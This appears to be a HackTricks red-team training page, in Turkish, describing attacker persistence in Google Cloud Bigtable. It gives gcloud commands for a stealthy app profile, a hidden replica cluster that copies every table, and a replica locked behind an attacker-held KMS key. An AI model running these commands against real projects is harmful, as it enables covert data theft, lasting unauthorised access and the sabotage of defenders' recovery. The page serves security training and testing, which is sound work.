# GCP - Bigtable Kalıcılık

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Bigtable hakkında daha fazla bilgi için bakınız:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

### Saldırgan için özel App Profile

**İzinler:** `bigtable.appProfiles.create`, `bigtable.appProfiles.update`.

Trafiği replica cluster'ınıza yönlendiren bir app profile oluşturun ve Data Boost'u etkinleştirerek savunucuların fark edebileceği provisioned nodes'lara asla bağımlı olmayın.

<details>

<summary>Gizli app profile oluştur</summary>
```bash
gcloud bigtable app-profiles create stealth-profile \
--instance=<instance-id> --route-any --restrict-to=<attacker-cluster> \
--row-affinity --description="internal batch"

gcloud bigtable app-profiles update stealth-profile \
--instance=<instance-id> --data-boost \
--data-boost-compute-billing-owner=HOST_PAYS
```
</details>

Bu profil var olduğu sürece ona referans veren yeni kimlik bilgileriyle yeniden bağlanabilirsiniz.

### Kendi replika kümenizi sürdürün

**İzinler:** `bigtable.clusters.create`, `bigtable.instances.update`, `bigtable.clusters.list`.

Az trafiğe sahip bir bölgede minimal düğüm sayısına sahip bir küme sağlayın. İstemci kimlikleriniz ortadan kalksa bile, **küme her tablonun tam bir kopyasını tutar**; savunucular açıkça kaldırana kadar.

<details>

<summary>Replika kümesi oluştur</summary>
```bash
gcloud bigtable clusters create dark-clone \
--instance=<instance-id> --zone=us-west4-b --num-nodes=1
```
</details>

Bunu `gcloud bigtable clusters describe dark-clone --instance=<instance-id>` ile izleyin, böylece veri çekmeniz gerektiğinde anında ölçeklendirebilirsiniz.

### Replikasyonu kendi CMEK'inizin arkasına kilitleyin

**İzinler:** `bigtable.clusters.create`, `cloudkms.cryptoKeyVersions.useToEncrypt` — saldırganın sahip olduğu anahtar üzerinde.

Klon oluştururken kendi KMS anahtarınızı getirin. O anahtar olmadan Google kümeyi yeniden oluşturamaz veya failover gerçekleştiremez; bu yüzden blue teams ona dokunmadan önce sizinle koordinasyon kurmalıdır.

<details>

<summary>CMEK korumalı küme oluşturun</summary>
```bash
gcloud bigtable clusters create cmek-clone \
--instance=<instance-id> --zone=us-east4-b --num-nodes=1 \
--kms-key=projects/<attacker-proj>/locations/<kms-location>/keyRings/<ring>/cryptoKeys/<key>
```
</details>

Projendeki anahtarı döndürün veya devre dışı bırakın, böylece replikayı anında kullanılamaz hale getirebilirsiniz (daha sonra tekrar açabilmenize izin verir).

{{#include ../../../banners/hacktricks-training.md}}
